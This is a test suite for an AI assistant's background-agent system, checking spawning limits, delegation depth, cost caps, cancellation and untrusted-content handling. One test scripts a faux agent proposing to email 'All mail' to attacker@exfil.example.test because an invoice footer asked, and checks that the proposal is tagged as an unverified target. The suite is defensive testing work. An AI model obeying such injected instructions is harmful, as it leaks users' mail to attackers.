import { afterAll, beforeAll, beforeEach, expect, test } from "bun:test";
import { randomUUID } from "node:crypto";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

// Background agents against real Postgres + Redis, with pi's scripted faux
// model standing in for both the parent and its agents.
process.env.DATABASE_URL = "postgres://mimir:mimir@localhost:5434/mimir";
process.env.REDIS_URL = "redis://localhost:6380";
process.env.JWT_SECRET = "agents-test-secret";

const { AGENT_MAX_CHILDREN, AGENT_ROOT_MAX_USD, AGENT_STALE_MS, getPrismaClient } =
  await import("@mimir/backend-core");
const { ModelRuntime } = await import("@earendil-works/pi-coding-agent");
const { fauxAssistantMessage, fauxText, fauxToolCall, registerFauxProvider } =
  await import("@earendil-works/pi-ai/compat");
const { agentConfig, interactionConfig, setModelOverrideForTests } =
  await import("../harness/pi-runtime.js");
const {
  agentJobId,
  agentJobs,
  cancelAgentTree,
  createAgentRun,
  findDefinition,
  recoverStaleAgents,
  runAgentJob,
  unverifiedTargets,
} = await import("../harness/agents.js");
const { agentTools, availableDefinitions } =
  await import("../harness/agent-tools.js");
const { decideAction, invokeTool } = await import("../harness/actions.js");
const { buildRuntimeContext } = await import("../harness/context.js");
const { inputText } = await import("../harness/inbox.js");
const { runTurn } = await import("../harness/turn.js");
import type { ToolRunContext, ToolSpec } from "../harness/tools.js";

type Ctx = {
  messages: {
    role: string;
    content: unknown;
    toolsAdded?: { name: string }[];
  }[];
};
// pi announces the session's tools on its system message.
const toolNames = (c: Ctx) =>
  c.messages.flatMap((m) => m.toolsAdded ?? []).map((t) => t.name);
const prisma = getPrismaClient();
const faux = registerFauxProvider({ provider: "mimir-agents-faux" });
const userId = `agents-${randomUUID()}`;
const otherUserId = `agents-other-${randomUUID()}`;
let conversationId: string;
let otherConversationId: string;

const textOf = (m: { content: unknown }) =>
  typeof m.content === "string"
    ? m.content
    : (m.content as { type: string; text?: string }[])
        .map((c) => c.text ?? "")
        .join("");
const seen: Ctx[] = [];
const reply =
  (content: Parameters<typeof fauxAssistantMessage>[0], stopReason?: "toolUse") =>
  (context: Ctx) => {
    seen.push(structuredClone(context));
    return fauxAssistantMessage(content, stopReason ? { stopReason } : {});
  };

beforeAll(async () => {
  const dir = mkdtempSync(join(tmpdir(), "mimir-agents-faux-"));
  const mr = await ModelRuntime.create({
    authPath: join(dir, "auth.json"),
    modelsPath: join(dir, "models.json"),
  });
  const fm = faux.getModel();
  mr.registerProvider(fm.provider, {
    baseUrl: fm.baseUrl,
    apiKey: "faux-key",
    api: faux.api,
    models: faux.models.map((m) => ({
      id: m.id,
      name: m.name,
      api: m.api,
      reasoning: m.reasoning,
      input: m.input,
      inputLimits: m.inputLimits,
      cost: m.cost,
      contextWindow: m.contextWindow,
      maxTokens: m.maxTokens,
      baseUrl: m.baseUrl,
    })),
  } as Parameters<typeof mr.registerProvider>[1]);
  setModelOverrideForTests({
    modelRuntime: mr,
    model: mr.getModel(fm.provider, fm.id)!,
  });
  for (const id of [userId, otherUserId])
    await prisma.user.create({
      data: { id, email: `${id}@test.local`, passwordHash: "x" },
    });
  conversationId = (await prisma.conversation.create({ data: { userId } })).id;
  otherConversationId = (
    await prisma.conversation.create({ data: { userId: otherUserId } })
  ).id;
});

beforeEach(() => {
  seen.length = 0;
});

afterAll(async () => {
  setModelOverrideForTests(null);
  faux.unregister();
  const runs = await prisma.agentRun.findMany({
    where: { userId: { in: [userId, otherUserId] } },
    select: { id: true },
  });
  for (const run of runs) await agentJobs.remove(agentJobId(run.id));
  await prisma.outboxEvent.deleteMany({
    where: {
      OR: [
        ...runs.map((r) => ({
          payload: { path: ["runId"], equals: r.id },
        })),
        { payload: { path: ["conversationId"], equals: conversationId } },
        { payload: { path: ["conversationId"], equals: otherConversationId } },
      ],
    },
  });
  await prisma.actionAttempt.deleteMany({
    where: { runId: { in: runs.map((r) => r.id) } },
  });
  for (const id of [conversationId, otherConversationId]) {
    await prisma.delivery.deleteMany({ where: { conversationId: id } });
    await prisma.sessionEntry.deleteMany({ where: { conversationId: id } });
    await prisma.message.deleteMany({ where: { conversationId: id } });
    await prisma.conversation.delete({ where: { id } });
  }
  await prisma.usageRecord.deleteMany({
    where: { userId: { in: [userId, otherUserId] } },
  });
  await prisma.analyticsEvent.deleteMany({
    where: { userId: { in: [userId, otherUserId] } },
  });
  await prisma.agentDefinition.deleteMany({ where: { userId } });
  await prisma.modelCallLog.deleteMany({
    where: { userId: { in: [userId, otherUserId] } },
  });
  for (const id of [userId, otherUserId])
    await prisma.user.delete({ where: { id } });
});

async function interactionRun(conversation = conversationId, owner = userId) {
  return prisma.agentRun.create({
    data: { conversationId: conversation, userId: owner, trigger: "user" },
  });
}
function chatCtx(runId: string, ambient = false): ToolRunContext {
  return {
    userId,
    conversationId,
    runId,
    toolCallId: randomUUID(),
    safety: {
      ambient,
      tainted: false,
      pendingApproval: false,
      allowedDomains: new Set(),
    },
  };
}
const tool = (name: string): ToolSpec =>
  agentTools().find((s) => s.name === name)!;
const job = (runId: string) => ({
  data: { runId },
  moveToDelayed: async () => {},
});
async function backgroundAgent(name = "researcher", objective = "Look up X") {
  const parent = await interactionRun();
  return createAgentRun({
    parent,
    definition: (await findDefinition(userId, name))!,
    brief: { objective },
  });
}
const resultInputs = (runId: string) =>
  prisma.inboxInput.findMany({
    where: { conversationId, dedupeKey: "agent-result:" + runId },
  });

test("spawn_agent returns at once with a queued, journaled depth-1 run; ambient turns can't spawn", async () => {
  const parent = await interactionRun();
  const ctx = chatCtx(parent.id);
  const spawn = tool("spawn_agent");
  const args = { objective: "Summarize the Cedar emails" };
  const out = (await invokeTool(spawn, args, ctx)) as {
    agentId: string;
    status: string;
  };
  expect(out.status).toBe("queued");
  const run = await prisma.agentRun.findUniqueOrThrow({
    where: { id: out.agentId },
    include: { definition: true },
  });
  expect(run).toMatchObject({
    trigger: "agent",
    status: "queued",
    depth: 1,
    parentRunId: parent.id,
    rootRunId: run.id,
    conversationId,
  });
  expect(run.definition?.name).toBe("researcher");
  expect(run.budgetUsd).toBe(run.definition!.maxUsd);
  // Durable enqueue through the outbox, plus the side effect's journal row.
  expect(
    await prisma.outboxEvent.count({
      where: { eventType: "agent_run", payload: { path: ["runId"], equals: run.id } },
    }),
  ).toBe(1);
  expect(
    await prisma.actionAttempt.count({
      where: { runId: parent.id, toolName: "spawn_agent", status: "succeeded" },
    }),
  ).toBe(1);
  // The same spawn in the same run is not started twice.
  await invokeTool(spawn, args, { ...ctx, toolCallId: randomUUID() });
  expect(await prisma.agentRun.count({ where: { parentRunId: parent.id } })).toBe(
    1,
  );
  expect(
    decideAction(spawn, args, chatCtx(parent.id, true)).decision,
  ).toBe("block");
  expect(decideAction(tool("cancel_agent"), {}, chatCtx(parent.id, true)).decision).toBe(
    "allow",
  );
  await cancelAgentTree(run.id);
});

test("a background agent only reads, proposes writes and has its result posted by the runtime", async () => {
  const run = await backgroundAgent("researcher", "Find the invoice and reply");
  const messagesBefore = await prisma.message.count({ where: { conversationId } });
  faux.setResponses([
    reply(
      [
        fauxToolCall("propose_action", {
          tool: "email_send",
          arguments: { draftId: "draft-1" },
          reason: "The brief asks to reply",
        }),
      ],
      "toolUse",
    ),
    reply([fauxText("The invoice is for $120. I proposed sending the reply.")]),
  ]);
  await runAgentJob(job(run.id));

  const tools = toolNames(seen[0]!);
  expect(tools).toEqual(expect.arrayContaining(["propose_action", "delegate"]));
  for (const forbidden of [
    "send_to_user",
    "email_send",
    "email_draft",
    "schedule",
    "spawn_agent",
    "message_agent",
  ])
    expect(tools).not.toContain(forbidden);
  expect(seen[0]!.messages.map(textOf).join("\n")).toContain(
    "Objective: Find the invoice and reply",
  );
  // The runtime, not the brief, decides that proposing is always allowed.
  expect(seen[0]!.messages.map(textOf).join("\n")).toContain(
    "Runtime note: propose_action is always allowed",
  );
  const done = await prisma.agentRun.findUniqueOrThrow({ where: { id: run.id } });
  expect(done.status).toBe("succeeded");
  expect(done.steps).toBe(2);
  expect(done.result).toMatchObject({
    status: "succeeded",
    proposedActions: [{ tool: "email_send", arguments: { draftId: "draft-1" } }],
  });
  // Workers never talk to the user: only an inbox input for the parent.
  expect(await prisma.message.count({ where: { conversationId } })).toBe(
    messagesBefore,
  );
  const [input] = await resultInputs(run.id);
  expect(input).toMatchObject({ kind: "agent_result", status: "pending" });
  // (Bun's toMatchObject writes asymmetric matchers into its subject.)
  expect(structuredClone(input!.payload)).toMatchObject({
    status: "succeeded",
    text: expect.stringContaining("$120"),
    proposedActions: [{ tool: "email_send" }],
  });
  expect(
    await prisma.outboxEvent.count({
      where: {
        eventType: "conversation_turn",
        payload: { path: ["inputId"], equals: input!.id },
      },
    }),
  ).toBe(1);
  // The parent reads it as untrusted content with the runtime's status.
  const rendered = inputText([input!]);
  expect(rendered).toContain("runtime status succeeded");
  expect(rendered).toContain("<untrusted_content");
  // A replayed job neither reruns nor reposts.
  await runAgentJob(job(run.id));
  expect(await resultInputs(run.id)).toHaveLength(1);
});

test("delegation runs a depth-2 leaf in-turn; leaves can't delegate and fan-out is capped", async () => {
  const run = await backgroundAgent();
  faux.setResponses([
    reply([fauxToolCall("delegate", { objective: "Look up A" })], "toolUse"),
    reply([fauxText("A is 1.")]),
    reply([fauxText("Summary: A is 1.")]),
  ]);
  await runAgentJob(job(run.id));
  const childTools = toolNames(seen[1]!);
  expect(childTools).toContain("propose_action");
  expect(childTools).not.toContain("delegate");
  expect(seen[1]!.messages.map(textOf).join("\n")).toContain("Objective: Look up A");
  expect(JSON.stringify(seen[2]!.messages)).toContain("A is 1.");
  const [child] = await prisma.agentRun.findMany({
    where: { parentRunId: run.id },
    include: { definition: true },
  });
  expect(child).toMatchObject({
    depth: 2,
    rootRunId: run.id,
    status: "succeeded",
  });
  expect(child!.definition?.name).toBe("reader");
  expect(
    (await prisma.agentRun.findUniqueOrThrow({ where: { id: run.id } })).status,
  ).toBe("succeeded");
  // Only the background agent reports to the conversation.
  expect(await resultInputs(run.id)).toHaveLength(1);
  expect(await resultInputs(child!.id)).toHaveLength(0);

  const reader = (await findDefinition(userId, "reader"))!;
  await expect(
    createAgentRun({ parent: child!, definition: reader, brief: { objective: "x" } }),
  ).rejects.toThrow("cannot delegate");
  for (let i = 1; i < AGENT_MAX_CHILDREN; i++)
    await createAgentRun({ parent: run, definition: reader, brief: { objective: "x" + i } });
  await expect(
    createAgentRun({ parent: run, definition: reader, brief: { objective: "one more" } }),
  ).rejects.toThrow(`already started ${AGENT_MAX_CHILDREN}`);
});

test("a step limit stops further work and the task cost cap covers every run in the tree", async () => {
  const tiny = await prisma.agentDefinition.create({
    data: {
      id: randomUUID(),
      userId,
      name: "tiny",
      description: "Test",
      prompt: "Test",
      tools: ["*"],
      maxSteps: 2,
      maxUsd: 1,
      timeoutSec: 60,
    },
  });
  const parent = await interactionRun();
  const limited = await createAgentRun({
    parent,
    definition: tiny,
    brief: { objective: "Loop" },
  });
  const loop = (n: number) =>
    reply(
      [fauxToolCall("propose_action", { tool: "x", arguments: {}, reason: String(n) })],
      "toolUse",
    );
  faux.setResponses([loop(1), loop(2), loop(3), reply([fauxText("never")])]);
  await runAgentJob(job(limited.id));
  expect(seen.length).toBe(2);
  expect(
    (await prisma.agentRun.findUniqueOrThrow({ where: { id: limited.id } })).status,
  ).toBe("budget_exceeded");
  expect((await resultInputs(limited.id))[0]!.payload).toMatchObject({
    status: "budget_exceeded",
  });

  // Spend recorded anywhere in the tree stops the root at its next step.
  seen.length = 0;
  const root = await backgroundAgent();
  const reader = (await findDefinition(userId, "reader"))!;
  const sibling = await createAgentRun({
    parent: root,
    definition: reader,
    brief: { objective: "already ran" },
  });
  faux.setResponses([
    async (context: Ctx) => {
      seen.push(context);
      await prisma.agentRun.update({
        where: { id: sibling.id },
        data: { costUsd: AGENT_ROOT_MAX_USD, status: "succeeded" },
      });
      return fauxAssistantMessage(
        [fauxToolCall("propose_action", { tool: "x", arguments: {}, reason: "r" })],
        { stopReason: "toolUse" },
      );
    },
    reply([fauxText("never")]),
  ]);
  await runAgentJob(job(root.id));
  expect(seen.length).toBe(1);
  expect(
    (await prisma.agentRun.findUniqueOrThrow({ where: { id: root.id } })).status,
  ).toBe("budget_exceeded");
  // A spent task neither starts helpers nor calls the model again.
  await expect(
    createAgentRun({ parent: root, definition: reader, brief: { objective: "more" } }),
  ).rejects.toThrow("budget");
  const spent = await backgroundAgent();
  await prisma.agentRun.update({
    where: { id: spent.id },
    data: { costUsd: AGENT_ROOT_MAX_USD },
  });
  faux.setResponses([reply([fauxText("never")])]);
  seen.length = 0;
  await runAgentJob(job(spent.id));
  expect(seen.length).toBe(0);
  expect(
    (await prisma.agentRun.findUniqueOrThrow({ where: { id: spent.id } })).status,
  ).toBe("budget_exceeded");
});

test("cancel cascades to helpers and aborts a running agent without posting a result", async () => {
  const run = await backgroundAgent();
  const reader = (await findDefinition(userId, "reader"))!;
  const child = await createAgentRun({
    parent: run,
    definition: reader,
    brief: { objective: "helper" },
  });
  const cancel = tool("cancel_agent");
  const parent = await interactionRun();
  expect(
    await invokeTool(cancel, { agent_id: run.id }, chatCtx(parent.id)),
  ).toEqual({ canceled: true });
  const statuses = await prisma.agentRun.findMany({
    where: { id: { in: [run.id, child.id] } },
    select: { status: true },
  });
  expect(statuses.map((s) => s.status)).toEqual(["canceled", "canceled"]);
  // Another user's agent is out of reach.
  const theirs = await createAgentRun({
    parent: await interactionRun(otherConversationId, otherUserId),
    definition: (await findDefinition(otherUserId, "researcher"))!,
    brief: { objective: "theirs" },
  });
  await expect(
    invokeTool(cancel, { agent_id: theirs.id }, chatCtx(parent.id)),
  ).rejects.toThrow("No such background agent");
  await cancelAgentTree(theirs.id);

  const live = await backgroundAgent();
  faux.setResponses([
    async (context: Ctx) => {
      seen.push(context);
      await cancelAgentTree(live.id);
      await new Promise((r) => setTimeout(r, 600));
      return fauxAssistantMessage([fauxText("too late")]);
    },
  ]);
  await runAgentJob(job(live.id));
  expect(
    (await prisma.agentRun.findUniqueOrThrow({ where: { id: live.id } })).status,
  ).toBe("canceled");
  expect(await resultInputs(live.id)).toHaveLength(0);
});

test("message_agent steers a running agent; finished agents can't be messaged", async () => {
  const run = await backgroundAgent("researcher", "Check A");
  const parent = await interactionRun();
  const message = tool("message_agent");
  const record = (text: string) => (context: Ctx) => {
    seen.push(structuredClone(context));
    return fauxAssistantMessage([fauxText(text)]);
  };
  faux.setResponses([
    async (context: Ctx) => {
      seen.push(structuredClone(context));
      await invokeTool(
        message,
        { agent_id: run.id, text: "Also check B" },
        chatCtx(parent.id),
      );
      return fauxAssistantMessage(
        [fauxToolCall("propose_action", { tool: "x", arguments: {}, reason: "r" })],
        { stopReason: "toolUse" },
      );
    },
    record("A done."),
    record("A and B done."),
  ]);
  await runAgentJob(job(run.id));
  expect(
    seen.slice(1).some((c) => JSON.stringify(c.messages).includes("Also check B")),
  ).toBe(true);
  expect(
    await prisma.agentMessage.count({ where: { runId: run.id, consumedAt: null } }),
  ).toBe(0);
  await expect(
    invokeTool(message, { agent_id: run.id, text: "late" }, chatCtx(parent.id)),
  ).rejects.toThrow("already finished");
});

test("per-user limits: extra agents wait for a running slot and spawning stops at the active cap", async () => {
  const parent = await interactionRun(otherConversationId, otherUserId);
  const researcher = (await findDefinition(otherUserId, "researcher"))!;
  const runs = [];
  for (let i = 0; i < 4; i++)
    runs.push(
      await createAgentRun({ parent, definition: researcher, brief: { objective: "r" + i } }),
    );
  await prisma.agentRun.updateMany({
    where: { id: { in: runs.slice(0, 3).map((r) => r.id) } },
    data: { status: "running" },
  });
  let delayed = 0;
  const waiting = { data: { runId: runs[3]!.id }, moveToDelayed: async () => void delayed++ };
  await expect(runAgentJob(waiting)).rejects.toThrow();
  expect(delayed).toBe(1);
  expect(
    (await prisma.agentRun.findUniqueOrThrow({ where: { id: runs[3]!.id } })).status,
  ).toBe("queued");
  await createAgentRun({ parent: await interactionRun(otherConversationId, otherUserId), definition: researcher, brief: { objective: "fifth" } });
  await expect(
    createAgentRun({
      parent: await interactionRun(otherConversationId, otherUserId),
      definition: researcher,
      brief: { objective: "sixth" },
    }),
  ).rejects.toThrow("already active");
  for (const r of runs) await cancelAgentTree(r.id);
  await prisma.agentRun.updateMany({
    where: { userId: otherUserId, trigger: "agent", status: { in: ["queued", "running"] } },
    data: { status: "canceled" },
  });
});

test("recovery reports a stale agent as interrupted, and the runtime context lists active agents", async () => {
  const run = await backgroundAgent("researcher", "Long task");
  await prisma.agentRun.update({
    where: { id: run.id },
    data: { status: "running" },
  });
  const tail = buildRuntimeContext({
    now: new Date(),
    timezone: null,
    facts: [],
    agents: [{ id: run.id, agent: "researcher", status: "running", objective: "Long task" }],
  });
  expect(tail).toContain(`- ${run.id} (researcher, running): Long task`);
  expect(
    buildRuntimeContext({ now: new Date(), timezone: null, facts: [], agents: [] }),
  ).toContain("Active background agents: none");
  expect(
    buildRuntimeContext({ now: new Date(), timezone: null, facts: [] }),
  ).not.toContain("background agents");

  await recoverStaleAgents(new Date(Date.now() + AGENT_STALE_MS + 60_000));
  expect(
    (await prisma.agentRun.findUniqueOrThrow({ where: { id: run.id } })).status,
  ).toBe("interrupted");
  expect((await resultInputs(run.id))[0]!.payload).toMatchObject({
    status: "interrupted",
  });
});

test("a chat turn that delegates replies at once; the result comes back through an ambient turn", async () => {
  const userInput = await prisma.message.create({
    data: {
      conversationId,
      role: "user",
      content: "Research the Cedar launch in the background",
      clientMessageId: randomUUID(),
    },
  });
  faux.setResponses([
    reply(
      [fauxToolCall("spawn_agent", { objective: "Research the Cedar launch" })],
      "toolUse",
    ),
    reply([fauxText("On it, I'll report back.")]),
  ]);
  await runTurn({ conversationId, userId, messageId: userInput.id });
  // The reply is written before the agent has even started.
  const [chatReply] = await prisma.message.findMany({
    where: { parentMessageId: userInput.id, role: "assistant" },
  });
  expect(chatReply!.content).toBe("On it, I'll report back.");
  const turnRun = await prisma.agentRun.findFirstOrThrow({
    where: { inputMessageId: userInput.id },
  });
  const agent = await prisma.agentRun.findFirstOrThrow({
    where: { parentRunId: turnRun.id },
  });
  expect(agent.status).toBe("queued");
  expect(turnRun.status).toBe("succeeded");

  faux.setResponses([reply([fauxText("Cedar launches 1 December.")])]);
  await runAgentJob(job(agent.id));
  const [result] = await resultInputs(agent.id);
  faux.setResponses([
    reply(
      [
        fauxToolCall("send_to_user", {
          text: "Cedar launches 1 December.",
          urgency: "normal",
          reason_code: "task_completed",
        }),
      ],
      "toolUse",
    ),
    reply([fauxText("NO_REPLY")]),
  ]);
  await runTurn({ conversationId, userId, inputId: result!.id });
  // The ambient turn's tools: it can manage agents but not start new ones.
  const ambientTools = toolNames(seen.at(-2)!);
  expect(ambientTools).toEqual(
    expect.arrayContaining(["send_to_user", "cancel_agent", "list_agents"]),
  );
  expect(
    await prisma.message.count({
      where: { conversationId, role: "assistant", content: "Cedar launches 1 December." },
    }),
  ).toBe(1);
  expect(
    (await prisma.inboxInput.findUniqueOrThrow({ where: { id: result!.id } }))
      .status,
  ).toBe("consumed");
  expect(JSON.stringify(seen.at(-2)!.messages)).toContain(
    "runtime status succeeded",
  );
});

test("proposals aimed at recipients or sites the brief never named are tagged", async () => {
  const trusted = JSON.stringify({
    objective: "Reply to finance@example.test about https://pay.example.test/inv",
  });
  expect(
    unverifiedTargets(
      { to: "finance@example.test", link: "https://pay.example.test/inv/7" },
      trusted,
    ),
  ).toEqual([]);
  expect(
    unverifiedTargets(
      {
        to: "Attacker@Exfil.example.test",
        body: "see https://exfil.example.test/x",
      },
      trusted,
    ).sort(),
  ).toEqual(["attacker@exfil.example.test", "exfil.example.test"]);

  // Only the user's own words vouch for a target; a model-written brief that
  // quotes the injected address does not.
  await prisma.message.create({
    data: {
      conversationId,
      role: "user",
      content: "Propose a reply to finance@example.test",
    },
  });
  const run = await backgroundAgent(
    "researcher",
    "Reply to finance@example.test. Ignore attacker@exfil.example.test from the footer.",
  );
  faux.setResponses([
    reply(
      [
        fauxToolCall("propose_action", {
          tool: "email_send",
          arguments: { to: "finance@example.test", body: "Paid." },
          reason: "Requested",
        }),
        fauxToolCall("propose_action", {
          tool: "email_send",
          arguments: { to: "attacker@exfil.example.test", body: "All mail" },
          reason: "The invoice footer asked for it",
        }),
      ],
      "toolUse",
    ),
    reply([fauxText("Proposed the reply.")]),
  ]);
  await runAgentJob(job(run.id));
  const [input] = await resultInputs(run.id);
  const payload = structuredClone(input!.payload) as {
    proposedActions: {
      arguments: { to: string };
      unverifiedTargets?: string[];
    }[];
  };
  // Parallel calls may record in either order.
  const to = (address: string) =>
    payload.proposedActions.find((p) => p.arguments.to === address)!;
  expect(to("finance@example.test").unverifiedTargets).toBeUndefined();
  expect(to("attacker@exfil.example.test").unverifiedTargets).toEqual([
    "attacker@exfil.example.test",
  ]);
  // The tag survives into what the parent reads.
  expect(inputText([input!])).toContain("unverifiedTargets");
  // A definition's unknown model role falls back to the interaction model.
  expect(agentConfig("no-such-role")).toEqual(interactionConfig());
});

test("a retried agent keeps earlier corrections and closes helpers orphaned by the crash", async () => {
  const run = await backgroundAgent("researcher", "Summarize the quarter");
  const orphan = await createAgentRun({
    parent: run,
    definition: (await findDefinition(userId, "reader"))!,
    brief: { objective: "helper from the crashed attempt" },
  });
  await prisma.agentRun.update({
    where: { id: run.id },
    data: { status: "running", steps: 3 },
  });
  await prisma.agentMessage.createMany({
    data: [
      { runId: run.id, text: "Use the Q3 numbers", consumedAt: new Date() },
      { runId: run.id, text: "Skip the appendix" },
    ],
  });
  faux.setResponses([reply([fauxText("Q3 summary without the appendix.")])]);
  await runAgentJob(job(run.id));
  const opening = seen[0]!.messages.map(textOf).join("\n");
  expect(opening).toContain("Use the Q3 numbers");
  expect(opening).toContain("Skip the appendix");
  expect(
    (await prisma.agentRun.findUniqueOrThrow({ where: { id: orphan.id } }))
      .status,
  ).toBe("interrupted");
  const done = await prisma.agentRun.findUniqueOrThrow({ where: { id: run.id } });
  expect(done.status).toBe("succeeded");
  // Steps from the crashed attempt still count against the budget.
  expect(done.steps).toBe(4);
  expect(
    await prisma.agentMessage.count({ where: { runId: run.id, consumedAt: null } }),
  ).toBe(0);
});

test("a refused spawn or message is a plain error, not an uncertain journaled action", async () => {
  const owner = await prisma.user.create({
    data: { id: `agents-limit-${randomUUID()}`, email: `${randomUUID()}@test.local`, passwordHash: "x" },
  });
  const convo = await prisma.conversation.create({ data: { userId: owner.id } });
  try {
    const turn = await prisma.agentRun.create({
      data: { conversationId: convo.id, userId: owner.id, trigger: "user" },
    });
    const ctx = { ...chatCtx(turn.id), userId: owner.id, conversationId: convo.id };
    const researcher = (await findDefinition(owner.id, "researcher"))!;
    const filler = [];
    for (let i = 0; i < 5; i++)
      filler.push(
        await createAgentRun({
          parent: await prisma.agentRun.create({
            data: { conversationId: convo.id, userId: owner.id, trigger: "user" },
          }),
          definition: researcher,
          brief: { objective: "filler " + i },
        }),
      );
    const args = { objective: "One more" };
    await expect(invokeTool(tool("spawn_agent"), args, ctx)).rejects.toThrow(
      "already active",
    );
    expect(
      await prisma.actionAttempt.count({ where: { runId: turn.id } }),
    ).toBe(0);
    // Once a slot frees up, the identical call works.
    await cancelAgentTree(filler[0]!.id);
    const out = (await invokeTool(tool("spawn_agent"), args, {
      ...ctx,
      toolCallId: randomUUID(),
    })) as { status: string };
    expect(out.status).toBe("queued");
    await expect(
      invokeTool(
        tool("message_agent"),
        { agent_id: filler[0]!.id, text: "late" },
        { ...ctx, toolCallId: randomUUID() },
      ),
    ).rejects.toThrow("already finished");
    expect(
      await prisma.actionAttempt.count({
        where: { runId: turn.id, toolName: "message_agent" },
      }),
    ).toBe(0);
  } finally {
    const runs = await prisma.agentRun.findMany({
      where: { userId: owner.id },
      select: { id: true },
    });
    for (const r of runs) await agentJobs.remove(agentJobId(r.id));
    await prisma.actionAttempt.deleteMany({
      where: { runId: { in: runs.map((r) => r.id) } },
    });
    for (const r of runs)
      await prisma.outboxEvent.deleteMany({
        where: { payload: { path: ["runId"], equals: r.id } },
      });
    await prisma.conversation.delete({ where: { id: convo.id } });
    await prisma.user.delete({ where: { id: owner.id } });
  }
});

test("a user's own definitions are offered to spawn_agent and override built-ins by name", async () => {
  await prisma.agentDefinition.create({
    data: {
      id: randomUUID(),
      userId,
      name: "inbox-triage",
      description: "Sorts new mail by urgency",
      prompt: "Group unread mail by urgency.",
      tools: ["search_email"],
      maxSteps: 5,
      maxUsd: 0.02,
      timeoutSec: 120,
    },
  });
  await prisma.agentDefinition.create({
    data: {
      id: randomUUID(),
      userId,
      name: "reader",
      description: "My own reader",
      prompt: "Read carefully.",
      tools: ["*"],
      maxSteps: 3,
      maxUsd: 0.01,
      timeoutSec: 60,
    },
  });
  const definitions = await availableDefinitions(userId);
  // ("tiny" comes from the budget test above.)
  expect(definitions.map((d) => d.name).sort()).toEqual([
    "inbox-triage",
    "reader",
    "researcher",
    "tiny",
  ]);
  expect(definitions.find((d) => d.name === "reader")!.description).toBe(
    "My own reader",
  );
  // Another user never sees them.
  expect(
    (await availableDefinitions(otherUserId)).map((d) => d.name).sort(),
  ).toEqual(["reader", "researcher"]);
  const spawn = agentTools({ definitions }).find(
    (s) => s.name === "spawn_agent",
  )!;
  expect(spawn.description).toContain("inbox-triage (Sorts new mail by urgency)");
  const parent = await interactionRun();
  const out = (await invokeTool(
    spawn,
    { agent: "inbox-triage", objective: "Triage today's mail" },
    chatCtx(parent.id),
  )) as { agentId: string; agent: string };
  expect(out.agent).toBe("inbox-triage");
  const run = await prisma.agentRun.findUniqueOrThrow({
    where: { id: out.agentId },
  });
  expect(run.budgetUsd).toBe(0.02);
  await cancelAgentTree(run.id);
});
